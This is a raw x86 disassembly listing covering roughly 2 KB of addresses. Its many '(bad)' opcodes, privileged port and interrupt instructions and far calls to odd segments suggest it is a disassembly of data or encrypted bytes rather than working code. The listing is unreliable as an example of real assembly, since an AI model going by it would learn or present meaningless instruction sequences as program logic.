  4182fd:	hlt    
  4182fe:	repz popf 
  418300:	mov    dl,al
  418302:	idiv   BYTE PTR [eax-0xecf3115]
  418308:	or     edi,DWORD PTR [ebp+0x1d257298]
  41830e:	sub    DWORD PTR ds:0x72dd8d06,ebp
  418314:	imul   ebp,DWORD PTR [ecx+0x5e],0x75
  418318:	(bad)  
  418319:	sbb    al,0xf9
  41831b:	(bad)  
  41831d:	pop    es
  41831e:	in     al,0xc4
  418320:	jl     0x41837f
  418322:	(bad)  
  418323:	in     eax,dx
  418324:	mov    WORD PTR [ebx],ss
  418326:	jg     0x418334
  418328:	call   DWORD PTR [edx-0x34b1327d]
  41832e:	xchg   esp,eax
  41832f:	mov    ds:0x3906ecbb,eax
  418334:	stc    
  418335:	ja     0x4182dc
  418337:	dec    ebx
  418338:	xor    bl,BYTE PTR [ecx-0x6f]
  41833b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41833c:	pop    ecx
  41833d:	jae    0x4182c1
  41833f:	test   al,0xd0
  418341:	jno    0x41830e
  418343:	dec    ebx
  418344:	cs mov eax,0x908ced44
  41834a:	ret    
  41834b:	sti    
  41834c:	dec    ebx
  41834d:	(bad)  
  41834f:	and    al,0x88
  418351:	mov    ebp,edx
  418353:	inc    ebp
  418354:	jnp    0x418384
  418356:	enter  0x5c2a,0x69
  41835a:	call   0x2de5:0xbc96d9e7
  418361:	add    DWORD PTR [edi+0xdc90320],eax
  418367:	push   esp
  418368:	pop    ebp
  418369:	sbb    DWORD PTR [ebx+0x3b],edx
  41836c:	mov    bh,0x7f
  41836e:	fiadd  WORD PTR [eax-0x1f9a972b]
  418374:	sub    BYTE PTR [esi+0x3],cl
  418377:	push   esp
  418378:	cmp    bl,BYTE PTR [edx+0x61]
  41837b:	addr16 mov al,ds:0x7c62
  41837f:	adc    DWORD PTR [esi+0x4dc9a89],ecx
  418385:	loop   0x418317
  418387:	lods   al,BYTE PTR ds:[esi]
  418388:	rol    DWORD PTR [edx+0x35],1
  41838b:	xchg   ecx,eax
  41838c:	or     esi,DWORD PTR [ecx]
  41838e:	sub    eax,ecx
  418390:	jecxz  0x418366
  418392:	sbb    al,0xee
  418394:	out    dx,eax
  418395:	adc    eax,esp
  418397:	cdq    
  418398:	xor    BYTE PTR [ebp+0x21382332],bh
  41839e:	jno    0x418381
  4183a0:	shl    DWORD PTR [ebx+0x64],cl
  4183a3:	ret    
  4183a4:	jle    0x4183c2
  4183a6:	inc    ebp
  4183a7:	imul   cl
  4183a9:	mov    ds:0xc8c656cc,eax
  4183ae:	inc    edx
  4183af:	pushf  
  4183b0:	loopne 0x418360
  4183b2:	push   0x4a
  4183b4:	pop    ebp
  4183b5:	or     edx,DWORD PTR [ebx]
  4183b7:	mov    esp,0xde6c2919
  4183bc:	out    0x8f,al
  4183be:	std    
  4183bf:	xchg   ecx,eax
  4183c0:	jnp    0x418405
  4183c2:	test   al,0xbd
  4183c4:	stos   BYTE PTR es:[edi],al
  4183c5:	(bad)  [edx]
  4183c7:	lods   eax,DWORD PTR ds:[esi]
  4183c8:	add    al,0xec
  4183ca:	aas    
  4183cb:	or     eax,0x3ab36feb
  4183d0:	jno    0x4183f1
  4183d2:	push   ebx
  4183d3:	inc    eax
  4183d4:	dec    eax
  4183d5:	mov    cl,0xc6
  4183d7:	jno    0x418372
  4183d9:	shl    cl,1
  4183db:	cmp    edx,DWORD PTR [edx+0x4ae92d59]
  4183e1:	mov    esp,0x51da6fb7
  4183e6:	push   ds
  4183e7:	fs mov ebx,0x87b990eb
  4183ed:	iret   
  4183ee:	add    cl,bl
  4183f0:	out    dx,eax
  4183f1:	mov    eax,ds:0xb0249858
  4183f6:	scas   eax,DWORD PTR es:[edi]
  4183f7:	das    
  4183f8:	cmp    al,0xcd
  4183fa:	lods   al,BYTE PTR ds:[esi]
  4183fb:	mov    al,cl
  4183fd:	pop    edi
  4183fe:	or     DWORD PTR [esi+0x31],esi
  418401:	div    BYTE PTR ds:0x6c0a110b
  418407:	enter  0xc6fa,0xae
  41840b:	cmp    bh,bl
  41840d:	add    eax,0xb402e4b
  418412:	imul   ebp,ebx,0xddbb4c82
  418418:	push   ebx
  418419:	add    eax,0xbc9fea92
  41841e:	mov    DWORD PTR [ebx+0x30],edi
  418421:	adc    ebx,DWORD PTR [edx+eiz*1+0x55]
  418425:	pop    ebx
  418426:	(bad)  
  418427:	loope  0x4184a1
  418429:	adc    bh,dh
  41842b:	outs   dx,DWORD PTR ds:[esi]
  41842c:	push   ds
  41842d:	adc    bh,BYTE PTR [edi+0xefe4ada]
  418433:	js     0x4183e4
  418435:	mov    WORD PTR [esi+eiz*4-0x66],gs
  418439:	sbb    DWORD PTR [ebx],ecx
  41843b:	cmc    
  41843c:	cmp    cl,bh
  41843e:	aad    0xe8
  418440:	push   edi
  418441:	pop    esi
  418442:	ins    BYTE PTR es:[edi],dx
  418443:	repz and DWORD PTR ds:0xb259d70c,edx
  41844a:	jae    0x41845d
  41844c:	jmp    0xed86db16
  418451:	call   0x8060:0x417494c0
  418458:	sbb    BYTE PTR [ebx+ecx*2+0x69],ah
  41845c:	cmp    ebp,DWORD PTR [eax-0x3e]
  41845f:	adc    dl,bh
  418461:	jecxz  0x4184aa
  418463:	push   es
  418464:	les    ecx,FWORD PTR [edi]
  418466:	jns    0x418427
  418468:	sub    eax,0x5e7428f4
  41846d:	aaa    
  41846e:	in     eax,dx
  41846f:	mov    ah,0x7a
  418471:	into   
  418472:	cmc    
  418473:	jae    0x418449
  418475:	xor    BYTE PTR [edx],dl
  418477:	mov    DWORD PTR [ebx+edi*8+0x46],edi
  41847b:	std    
  41847c:	(bad)  
  41847d:	jp     0x4184ef
  41847f:	dec    ecx
  418480:	in     eax,dx
  418481:	jb     0x418417
  418483:	dec    esp
  418484:	or     al,0xf1
  418486:	push   edi
  418487:	or     al,0xf6
  418489:	fdivr  QWORD PTR [eax+0x6780e81e]
  41848f:	test   BYTE PTR [esi+esi*8-0x29],0x29
  418494:	mov    eax,ds:0x70b9546
  418499:	or     DWORD PTR [edx],edi
  41849b:	inc    ecx
  41849c:	sub    DWORD PTR [esi],edi
  41849e:	push   es
  41849f:	xchg   ebp,eax
  4184a0:	dec    ebx
  4184a1:	gs and eax,0xca79eadb
  4184a7:	imul   ebx,eax,0xffffffb2
  4184aa:	mov    dh,0x39
  4184ac:	cmp    eax,0x219ef44b
  4184b1:	int    0x2a
  4184b3:	(bad)  [ebx-0x3b]
  4184b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4184b7:	(bad)  
  4184b8:	dec    ecx
  4184b9:	xchg   ebx,eax
  4184ba:	jl     0x4184d3
  4184bc:	cmp    al,0x5a
  4184be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4184bf:	mov    WORD PTR [edx],?
  4184c1:	(bad)  
  4184c3:	into   
  4184c4:	inc    esp
  4184c5:	adc    al,0x43
  4184c7:	sub    al,0xb5
  4184c9:	inc    edi
  4184ca:	inc    BYTE PTR [edi]
  4184cc:	data16 xor dl,BYTE PTR [ebx+0x93cb7ca]
  4184d3:	cmp    DWORD PTR [eax-0x411e32ad],ebp
  4184d9:	cmp    eax,0x73e2e922
  4184de:	sub    edi,eax
  4184e0:	or     ch,BYTE PTR [ecx-0x7]
  4184e3:	jae    0x41847d
  4184e5:	xor    BYTE PTR [eax+0xf],dh
  4184e8:	test   ebx,eax
  4184ea:	adc    BYTE PTR [ebx-0x5d3fd31f],dh
  4184f0:	retf   0x80e7
  4184f3:	xor    BYTE PTR [esi+0x60],cl
  4184f6:	cmp    BYTE PTR [eax+0x56],cl
  4184f9:	nop
  4184fa:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4184fb:	sbb    dl,dh
  4184fd:	sub    BYTE PTR [edx+0x5d104dd5],0xea
  418504:	cmc    
  418505:	xchg   DWORD PTR [ebx-0x6c],edx
  418508:	int3   
  418509:	sub    eax,0x1bf3624c
  41850e:	fiadd  WORD PTR [ecx]
  418510:	out    dx,eax
  418511:	hlt    
  418512:	jns    0x418526
  418514:	jne    0x418537
  418516:	push   edx
  418517:	jl     0x418575
  418519:	xor    ebx,DWORD PTR [ebx-0x14]
  41851c:	pop    ebp
  41851d:	lock in al,0x18
  418520:	xor    edi,ebx
  418522:	int3   
  418523:	test   al,0x35
  418525:	fabs   
  418527:	xor    DWORD PTR [esp+edx*2],esi
  41852a:	inc    edx
  41852b:	jle    0x41856a
  41852d:	mov    ecx,0x92b6dd3f
  418532:	dec    edi
  418533:	ins    DWORD PTR es:[edi],dx
  418534:	pop    ds
  418535:	mul    DWORD PTR [esi]
  418537:	cmp    BYTE PTR [ebx+ecx*4-0x4d],al
  41853b:	pop    DWORD PTR [ebp-0x3d]
  41853e:	addr16 xchg edx,eax
  418540:	add    BYTE PTR [eax],cl
  418542:	jb     0x4185ba
  418544:	in     al,dx
  418545:	and    eax,0x269a4aed
  41854a:	cs stos BYTE PTR es:[edi],al
  41854c:	sbb    edi,DWORD PTR [edx-0x693a87f5]
  418552:	pop    ss
  418553:	ss and eax,0xef73855e
  418559:	iret   
  41855a:	push   edx
  41855b:	and    BYTE PTR ds:0x4d0b03d7,al
  418561:	inc    eax
  418562:	add    al,0xcc
  418564:	cmp    al,0xa5
  418566:	stos   DWORD PTR es:[edi],eax
  418567:	inc    esi
  418568:	xlat   BYTE PTR ds:[ebx]
  418569:	test   BYTE PTR ds:[edi],dl
  41856c:	inc    ebp
  41856d:	je     0x4185d7
  41856f:	sahf   
  418570:	pop    esp
  418571:	adc    al,0x58
  418573:	push   ebx
  418574:	mov    esi,0x85726992
  418579:	int    0x87
  41857b:	stc    
  41857c:	add    BYTE PTR [esi-0x7a],ch
  41857f:	sbb    DWORD PTR [edx],ecx
  418581:	popf   
  418582:	stos   DWORD PTR es:[edi],eax
  418583:	or     eax,DWORD PTR [eax+0x1ef0a0f8]
  418589:	rcr    DWORD PTR [edi+0x73534b96],1
  41858f:	mov    dh,0x1f
  418591:	adc    DWORD PTR [edx+0x746593a3],eax
  418597:	mov    esi,0xa3e49516
  41859c:	mov    ebp,0x25914d5
  4185a1:	xchg   esp,eax
  4185a2:	mov    BYTE PTR [ebx+edi*4+0x42],bl
  4185a6:	test   dh,ch
  4185a8:	push   ebx
  4185a9:	retf   0xc3fe
  4185ac:	add    DWORD PTR [eax-0x35d352c4],edx
  4185b2:	jo     0x418569
  4185b4:	popa   
  4185b5:	cdq    
  4185b6:	test   al,0xfe
  4185b8:	repnz inc ecx
  4185ba:	mov    dh,0x75
  4185bc:	fisub  DWORD PTR [ecx-0x1193f8bf]
  4185c2:	fidivr WORD PTR ss:[edx-0x2f]
  4185c6:	push   0x81f58aba
  4185cb:	mov    cs,ebx
  4185cd:	into   
  4185ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4185cf:	retf   0xd3c3
  4185d2:	(bad)  
  4185d4:	mov    ebp,0xa6d3aade
  4185d9:	mov    dl,0xb6
  4185db:	shl    DWORD PTR [ebx],cl
  4185dd:	pop    es
  4185de:	out    dx,al
  4185df:	push   ds
  4185e0:	sbb    edi,DWORD PTR [ebx+edi*4]
  4185e3:	xchg   BYTE PTR [eax-0x5c],bl
  4185e6:	mov    ah,0x51
  4185e8:	dec    DWORD PTR [edx-0x3f7c6e12]
  4185ee:	mov    eax,0x269969d8
  4185f3:	cmp    eax,0x471b06a3
  4185f8:	mov    ds:0xb3b28c6a,eax
  4185fd:	dec    esi
  4185fe:	and    BYTE PTR [ecx],dl
  418600:	ficomp WORD PTR [esi-0x4f]
  418603:	xchg   DWORD PTR [esi+ebx*2],edx
  418606:	add    DWORD PTR [ebx-0x1c],0x77
  41860a:	mov    ebp,0xa6352e3a
  41860f:	mov    cs,ecx
  418611:	xchg   edx,eax
  418612:	xchg   esp,eax
  418613:	push   ds
  418614:	int    0x93
  418616:	jb     0x4185c3
  418618:	retf   0xf3c2
  41861b:	mov    eax,0xae25c70a
  418620:	sbb    BYTE PTR [esi+ebx*8],0x47
  418624:	cs test eax,0xeaec095e
  41862a:	push   ebp
  41862b:	jne    0x4185b6
  41862d:	les    edx,FWORD PTR [ebx]
  41862f:	fcom   DWORD PTR [ecx-0x4b]
  418632:	fs jmp 0x418600
  418635:	lahf   
  418636:	and    eax,0x4caf8d7a
  41863b:	push   0xd389ef14
  418640:	push   eax
  418641:	test   eax,0x17fbdd89
  418646:	or     eax,0x3b875b68
  41864b:	cs fadd st(7),st
  41864e:	sbb    dl,0xb1
  418651:	fisubr WORD PTR [esi-0x75]
  418654:	cmp    bh,BYTE PTR [ecx]
  418656:	sti    
  418657:	out    0x79,eax
  418659:	cmp    bl,BYTE PTR [eax-0x7c]
  41865c:	sub    ebp,esp
  41865e:	repnz cmp al,0x7a
  418661:	mov    cl,0xeb
  418663:	pop    ebp
  418664:	jnp    0x418618
  418666:	gs out 0x12,eax
  418669:	push   esp
  41866a:	mov    esi,DWORD PTR [ebx+esi*2+0x62fb4708]
  418671:	mov    dl,0xf5
  418673:	cmp    esp,esp
  418675:	jns    0x4186c0
  418677:	jmp    0xf0e91f87
  41867c:	pop    eax
  41867d:	add    al,0xa3
  41867f:	ja     0x4186c1
  418681:	in     al,dx
  418682:	repz mov ds:0x2e366eb6,eax
  418688:	stc    
  418689:	imul   eax,DWORD PTR [edx+0x7cc52573],0x28
  418690:	xchg   edi,eax
  418691:	mov    eax,ds:0xa39a8c44
  418696:	stos   DWORD PTR es:[edi],eax
  418697:	push   esi
  418698:	jo     0x4186a2
  41869a:	or     DWORD PTR [ebx+0x22320efa],0xfa98f972
  4186a4:	test   eax,0x83d88b2
  4186a9:	xor    DWORD PTR [eax-0x6b],0x14ffcf4
  4186b0:	add    esp,DWORD PTR [eax]
  4186b2:	mov    ch,0xab
  4186b4:	es mov esi,0x1d72470c
  4186ba:	adc    ch,dl
  4186bc:	cmp    BYTE PTR [edx-0x2f4e47b8],al
  4186c2:	xor    edx,eax
  4186c4:	jmp    DWORD PTR [esi-0x7036d523]
  4186ca:	xchg   edi,eax
  4186cb:	xor    eax,DWORD PTR [esi]
  4186cd:	imul   ebx,DWORD PTR [ebp-0x43],0x48
  4186d1:	pop    di
  4186d3:	xchg   edi,eax
  4186d4:	jg     0x4186a8
  4186d6:	rcr    DWORD PTR [ebx+0x36],1
  4186d9:	das    
  4186da:	dec    ebp
  4186db:	jae    0x418732
  4186dd:	push   ds
  4186de:	lea    esi,[eax+0x5d]
  4186e1:	mov    edi,0x31dedd61
  4186e6:	mov    ch,0xfd
  4186e8:	mov    dl,0x2a
  4186ea:	xchg   edx,eax
  4186eb:	push   edi
  4186ec:	mov    cl,0x88
  4186ee:	repnz pop esi
  4186f0:	pop    eax
  4186f1:	mov    eax,ds:0xc231f578
  4186f6:	retf   0xf7e9
  4186f9:	sub    cl,BYTE PTR [edi-0x7c]
  4186fc:	adc    BYTE PTR [ebp-0x30],dh
  4186ff:	push   cs
  418700:	push   0xffffffb7
  418702:	mov    ebx,0x28ed03e9
  418707:	or     eax,0x3b424e08
  41870c:	enter  0x9a3c,0xeb
  418710:	inc    ebp
  418711:	shl    cl,1
  418713:	outs   dx,DWORD PTR ds:[esi]
  418714:	sub    dl,ah
  418716:	xchg   ebx,eax
  418717:	mov    ?,WORD PTR [eax+eax*1+0x67141977]
  41871e:	loop   0x418731
  418720:	(bad)  
  418721:	jle    0x418779
  418723:	push   DWORD PTR [ebp-0x1e6d248f]
  418729:	add    BYTE PTR [ebp-0x12],ch
  41872c:	mov    dl,0x5b
  41872e:	mov    ah,0xc2
  418730:	int    0x19
  418732:	pusha  
  418733:	test   bl,ch
  418735:	sub    BYTE PTR [eax],0x64
  418738:	retf   
  418739:	add    dl,BYTE PTR [eax]
  41873b:	sbb    cl,BYTE PTR [ebp+0x63]
  41873e:	sub    al,0xf3
  418740:	(bad)  
  418741:	mov    dl,0xdb
  418743:	mov    WORD PTR [ecx],ds
  418745:	js     0x41872a
  418747:	loope  0x418720
  418749:	(bad)  
  41874a:	dec    esp
  41874b:	xor    DWORD PTR [ecx-0x24],0xffffffb2
  41874f:	loop   0x4187a6
  418751:	xor    eax,0xde63aa9f
  418756:	int    0x34
  418758:	add    edi,DWORD PTR [esi-0x602ae468]
  41875e:	ins    DWORD PTR es:[edi],dx
  41875f:	or     BYTE PTR [esp+ebx*4+0x2f7a6c3],al
  418766:	xchg   ebp,eax
  418767:	rol    DWORD PTR [ecx+0x2a],0x15
  41876b:	adc    eax,0xd48e45c6
  418770:	aas    
  418771:	adc    ebx,DWORD PTR [edx-0x3f]
  418774:	fs xor al,0xb9
  418777:	cmp    DWORD PTR [esi-0x5b],edx
  41877a:	(bad)  
  41877b:	mul    DWORD PTR [edi]
  41877d:	inc    ebx
  41877e:	pop    esp
  41877f:	push   DWORD PTR [ebp+0x37]
  418782:	dec    ebp
  418783:	not    bl
  418785:	push   ebx
  418786:	call   0x69b2:0xe3d8666
  41878d:	sub    al,BYTE PTR [ecx-0x54]
  418790:	jnp    0x41871a
  418792:	(bad)  
  418793:	pop    esi
  418794:	fidivr WORD PTR [esi-0x2f8f8099]
  41879a:	bound  edx,QWORD PTR [ecx+ebp*4+0x10726c6a]
  4187a1:	lahf   
  4187a2:	xchg   edi,eax
  4187a3:	jno    0x4187d8
  4187a5:	stos   DWORD PTR es:[edi],eax
  4187a6:	adc    al,al
  4187a8:	test   DWORD PTR [ebp+0x3f],esp
  4187ab:	fwait
  4187ac:	call   0xce5fdf2c
  4187b1:	mov    esi,0xfb865542
  4187b6:	rcl    BYTE PTR [ebx],cl
  4187b8:	xlat   BYTE PTR ds:[ebx]
  4187b9:	sub    BYTE PTR [ebx],bl
  4187bb:	cld    
  4187bc:	mov    ds:0x9a405bc8,eax
  4187c1:	add    edx,DWORD PTR [eax]
  4187c3:	sub    al,0xef
  4187c5:	nop
  4187c6:	sti    
  4187c7:	pop    es
  4187c8:	pusha  
  4187c9:	push   eax
  4187ca:	inc    ebp
  4187cb:	xor    esi,edi
  4187cd:	sahf   
  4187ce:	inc    ebp
  4187cf:	cdq    
  4187d0:	jg     0x41881d
  4187d2:	xchg   BYTE PTR [esi-0x7cf5ef58],bh
  4187d8:	mov    bl,0x12
  4187da:	rcl    DWORD PTR [ecx+ebp*1],1
  4187dd:	or     ch,0x2a
  4187e0:	ret    0xbf4b
  4187e3:	sbb    BYTE PTR [ebp-0x73661e5a],al
  4187e9:	shl    dh,1
  4187eb:	out    0xe0,eax
  4187ed:	out    0xab,al
  4187ef:	add    DWORD PTR [edx-0x373f53e6],esp
  4187f5:	icebp  
  4187f6:	mov    cl,0x80
  4187f8:	xchg   edx,eax
  4187f9:	and    al,0x94
  4187fb:	fnstenv [ebp-0x3a309467]
  418801:	test   BYTE PTR [esi],bh
  418803:	pop    eax
  418804:	ret    
  418805:	mov    eax,ds:0x282b7932
  41880a:	nop
  41880b:	sub    eax,0x6fea102
  418810:	sub    edx,DWORD PTR [edi+0x1f288aeb]
  418816:	nop
  418817:	(bad)  
  418818:	imul   esp,DWORD PTR [ecx+ecx*1+0x7a2990a3],0x46
  418820:	jno    0x41888a
  418822:	rol    esp,cl
  418824:	icebp  
  418825:	jge    0x4187bb
  418827:	mov    ch,0x5a
  418829:	sbb    DWORD PTR [edi+0x53c08ac5],ebx
  41882f:	xor    BYTE PTR [edi+0x25],bh
  418832:	shl    BYTE PTR [esp+eax*2-0x617fefe3],1
  418839:	into   
  41883a:	sub    esi,DWORD PTR [esi+0x3023b6c5]
  418840:	adc    al,0x45
  418842:	pushf  
  418843:	pop    ebx
  418844:	sbb    BYTE PTR [edi],dl
  418846:	and    dl,cl
  418848:	ret    0x3b6b
  41884b:	dec    ebp
  41884c:	inc    edx
  41884d:	cmc    
  41884e:	mov    ch,0x85
  418850:	sub    al,0x6e
  418853:	xchg   edi,eax
  418854:	scas   al,BYTE PTR es:[edi]
  418855:	jnp    0x418838
  418857:	mov    edx,0x56f7b55
  41885c:	inc    edx
  41885d:	pop    esp
  41885e:	dec    ebx
  41885f:	cli    
  418860:	inc    edx
  418861:	mov    WORD PTR [eax+0x1417ee3a],fs
  418867:	jae    0x4188e2
  418869:	pop    edi
  41886a:	loopne 0x418869
  41886c:	sub    bh,BYTE PTR [eax]
  41886e:	jae    0x418847
  418870:	aaa    
  418871:	cmp    eax,DWORD PTR [ecx+0x7e428092]
  418877:	or     esp,DWORD PTR [esi+0x590f9608]
  41887d:	push   es
  41887e:	jge    0x4188d1
  418880:	cs mov edx,0x1a785804
  418886:	sbb    BYTE PTR ds:0x84454da9,bh
  41888c:	das    
  41888d:	dec    edi
  41888e:	loope  0x4188a2
  418890:	sbb    eax,0x211d37e5
  418895:	test   eax,0xaf7e27b5
  41889a:	adc    eax,0x9e67e60c
  41889f:	xor    BYTE PTR [edx],0x28
  4188a2:	inc    esp
  4188a3:	mov    cl,BYTE PTR [eax-0x2b]
  4188a6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4188a7:	jge    0x4188ab
  4188a9:	sahf   
  4188aa:	push   ebx
  4188ab:	xchg   edi,eax
  4188ac:	js     0x4188d4
  4188ae:	ins    DWORD PTR es:[edi],dx
  4188af:	xchg   edx,eax
  4188b0:	in     al,dx
  4188b1:	mov    cl,0xb5
  4188b3:	aad    0x13
  4188b5:	jg     0x418876
  4188b7:	(bad)  
  4188b8:	arpl   WORD PTR [ecx],di
  4188ba:	jge    0x41892f
  4188bc:	jge    0x418939
  4188be:	sub    BYTE PTR [eax-0x2a],cl
  4188c1:	sub    cl,BYTE PTR gs:[ebp-0x38db5ae1]
  4188c8:	ja     0x418872
  4188ca:	sti    
  4188cb:	or     eax,0x6e500bc2
  4188d0:	scas   eax,DWORD PTR es:[edi]
  4188d1:	les    esi,FWORD PTR [ecx+0x581f2d0c]
  4188d7:	pusha  
  4188d8:	sbb    eax,0x40b65f18
  4188dd:	jo     0x41887d
  4188df:	add    eax,0x7751709f
  4188e4:	test   BYTE PTR [ecx],bl
  4188e6:	cmp    al,0x12
  4188e8:	pop    es
  4188e9:	loop   0x418892
  4188eb:	mov    ebx,0x56b0a946
  4188f0:	cmp    BYTE PTR [eax+0x29],dh
  4188f3:	cwde   
  4188f4:	cdq    
  4188f5:	mov    edi,0x3ca34c1e
  4188fa:	mov    al,ds:0xc7115c44
  4188ff:	daa    
  418900:	xchg   BYTE PTR [ebx],bl
  418902:	jg     0x4188ec
  418904:	sbb    eax,0x2d413e11
  418909:	cmc    
  41890a:	sahf   
  41890b:	neg    DWORD PTR ds:0xbf6a958c
  418911:	nop
  418912:	loopne 0x41897f
  418914:	imul   ecx,DWORD PTR [ebx],0x2cb9086
  41891a:	cmp    eax,0x7a5e2d56
  41891f:	push   edx
  418920:	cmp    BYTE PTR [edi-0x18ba0333],bl
  418926:	gs adc ah,ah
  418929:	and    BYTE PTR [edi-0x7f],dh
  41892c:	jl     0x4188ec
  41892e:	mov    ch,0xc1
  418930:	sub    al,0x58
  418932:	mov    edx,0x53a7cbcb
  418937:	aam    0xa5
  418939:	cmp    eax,0xfc7bd9ae
  41893e:	clc    
  41893f:	sbb    DWORD PTR [ebp+0x1c0316c8],ebx
  418945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418946:	adc    esi,DWORD PTR [edi]
  418948:	stos   DWORD PTR es:[edi],eax
  418949:	inc    eax
  41894a:	jno    0x41892d
  41894c:	xchg   esp,eax
  41894d:	add    al,0x20
  41894f:	ins    BYTE PTR es:[edi],dx
  418950:	rcl    DWORD PTR [edi],cl
  418952:	fcom   DWORD PTR gs:[edi]
  418955:	add    eax,0x2a446b67
  41895a:	xchg   esi,eax
  41895b:	(bad)  
  41895c:	jne    0x418902
  41895e:	xchg   edi,eax
  41895f:	hlt    
  418960:	daa    
  418961:	xchg   ch,dh
  418963:	stc    
  418964:	cdq    
  418965:	xchg   esp,eax
  418966:	test   BYTE PTR [eax],0x51
  418969:	mov    WORD PTR [eax-0x4e],ds
  41896c:	cmp    dh,ch
  41896e:	call   0x4c8e:0xea0773f9
  418975:	inc    edi
  418976:	adc    eax,0x896d954f
  41897b:	xor    BYTE PTR [ecx-0x3d],bl
  41897e:	push   0xfeb626c6
  418983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418984:	inc    ebp
  418985:	dec    ecx
  418986:	fnstsw WORD PTR [edx+0x4b]
  418989:	(bad)  
  41898a:	rol    BYTE PTR [ebp+0x4d],1
  41898d:	add    DWORD PTR [edx],0x80e2f15b
  418993:	pop    ebp
  418994:	inc    eax
  418995:	lock mov esi,0xf8dd080d
  41899b:	mov    bh,0xfe
  41899d:	pop    ss
  41899e:	adc    BYTE PTR [ecx+eax*4-0x3e],bl
  4189a2:	and    al,0x44
  4189a4:	xor    al,0xe0
  4189a6:	mov    ah,0xc9
  4189a8:	pop    ebx
  4189a9:	or     eax,0x467bd2a3
  4189ae:	adc    eax,0x80d40d40
  4189b3:	(bad)  
  4189b4:	mov    eax,ds:0xa92211a2
  4189b9:	jae    0x41898e
  4189bb:	xor    edi,edx
  4189bd:	adc    eax,0xc54480
  4189c2:	add    esp,DWORD PTR [edx]
  4189c4:	sahf   
  4189c5:	jb     0x41899d
  4189c7:	xchg   ecx,eax
  4189c8:	push   ds
  4189c9:	daa    
  4189ca:	xor    DWORD PTR [ebx-0x72],edx
  4189cd:	enter  0xb493,0xd9
  4189d1:	or     edi,DWORD PTR [edi+edi*8+0x2f]
  4189d5:	xchg   edx,eax
  4189d6:	and    al,0xc
  4189d8:	(bad)  
  4189d9:	jge    0x418a04
  4189db:	pop    edx
  4189dc:	inc    BYTE PTR ds:0x7d056178
  4189e2:	mov    cl,0x83
  4189e4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4189e5:	aas    
  4189e6:	data16 mov bh,0x9a
  4189e9:	retf   0x9f79
  4189ec:	pop    edi
  4189ed:	xchg   DWORD PTR [edi+0x4b95b8d5],ebx
  4189f3:	and    ah,BYTE PTR [esi+0x47]
  4189f6:	fidivr DWORD PTR [eax+ebx*1]
  4189f9:	in     al,0xab
  4189fb:	call   0xb473:0x3ecfe8b
  418a02:	push   0x10
  418a04:	test   al,0xce
  418a06:	retf   0xa49b
  418a09:	pop    eax
  418a0a:	jne    0x418a8b
  418a0c:	push   eax
  418a0d:	inc    edx
  418a0e:	stos   DWORD PTR es:[edi],eax
  418a0f:	sbb    DWORD PTR [ebx+edx*2],edx
  418a12:	add    esi,esi
  418a14:	jle    0x4189e4
  418a16:	inc    esi
  418a17:	int    0x46
  418a19:	ret    
  418a1a:	out    dx,al
  418a1b:	xlat   BYTE PTR ds:[ebx]
  418a1c:	je     0x418a6e
  418a1e:	xor    ebp,DWORD PTR [edi]
  418a20:	dec    ebx
  418a21:	and    DWORD PTR [esi-0x6ad95588],0xed35fa3f
  418a2b:	mov    esp,0x91d93693
  418a30:	or     BYTE PTR [edx+0x640f497],0xf6
  418a37:	xchg   ebx,eax
  418a38:	arpl   WORD PTR [esi-0x6c],bp
  418a3b:	fnsetpm(287 only) 
  418a3d:	leave  
  418a3e:	rcl    BYTE PTR [ebp+ebp*2-0x50],1
  418a42:	dec    ebp
  418a43:	mov    ah,BYTE PTR [ebx-0x76c76e20]
  418a49:	sahf   
  418a4a:	loop   0x4189d6
  418a4c:	and    eax,esp
  418a4e:	in     eax,dx
  418a4f:	mov    dh,0x28
  418a51:	xor    al,0xb9
  418a53:	or     al,0xd1
  418a55:	adc    cl,bh
  418a57:	repnz adc eax,0xd7ead218
  418a5d:	mov    ch,0xa3
  418a5f:	push   ss
  418a60:	push   ss
  418a61:	shr    DWORD PTR [edx+0x7cc33ac0],cl
  418a67:	xchg   BYTE PTR [edi],dl
  418a69:	xchg   edx,eax
  418a6a:	lods   eax,DWORD PTR ds:[esi]
  418a6b:	mov    ch,0x41
  418a6d:	idiv   DWORD PTR [ebp+esi*4-0x61b85c14]
  418a74:	or     edx,ebp
  418a76:	and    esi,eax
  418a78:	test   BYTE PTR [esi+0x5255dd88],ah
  418a7e:	rol    edx,0x2d
  418a81:	mov    bl,0x88
  418a83:	sbb    DWORD PTR [eax+ebx*2-0x80],0x39
  418a88:	cmp    DWORD PTR [esi+0x7fb8b26b],0xf61f03ce
  418a92:	das    
  418a93:	shl    DWORD PTR [esp+ecx*8-0x708d019d],cl
  418a9a:	scas   eax,DWORD PTR es:[edi]
  418a9b:	(bad)  
  418a9c:	dec    ebx
  418a9d:	sahf   
  418a9e:	xchg   esi,eax
  418a9f:	xor    al,0x86
  418aa1:	add    BYTE PTR [esi],ch
  418aa3:	xor    DWORD PTR [edx+0x7c73ae82],0x7e7f9d0d
  418aad:	dec    ecx
  418aae:	stc    
  418aaf:	mov    eax,ds:0x67cc7953
  418ab4:	fsubr  DWORD PTR [edx+0x53fb64aa]
  418aba:	stos   DWORD PTR es:[edi],eax
  418abb:	out    dx,al
  418abc:	pop    ecx
  418abd:	xlat   BYTE PTR ds:[ebx]
  418abe:	or     dh,ah
  418ac0:	hlt    
  418ac1:	mov    cl,0x88
  418ac3:	mov    esi,0xd65ff004
  418ac8:	inc    ebp
  418ac9:	jp     0x418a89
  418acb:	mov    ecx,0xb76c4ae9
  418ad0:	or     al,0x58
  418ad2:	imul   ecx,esp,0x6058c131
  418ad8:	out    dx,al
  418ad9:	mov    bh,0xf9
  418adb:	out    dx,eax
  418adc:	pop    esp
  418add:	xor    ebx,DWORD PTR [ebp+esi*2-0x73af432c]
  418ae4:	(bad)  
  418ae5:	sbb    al,0x18
  418ae7:	cdq    
  418ae8:	fnstsw WORD PTR [ebx]
  418aea:	or     esi,edx
  418aec:	je     0x418a85
  418aee:	inc    ebx
  418aef:	push   cs
  418af0:	cdq    
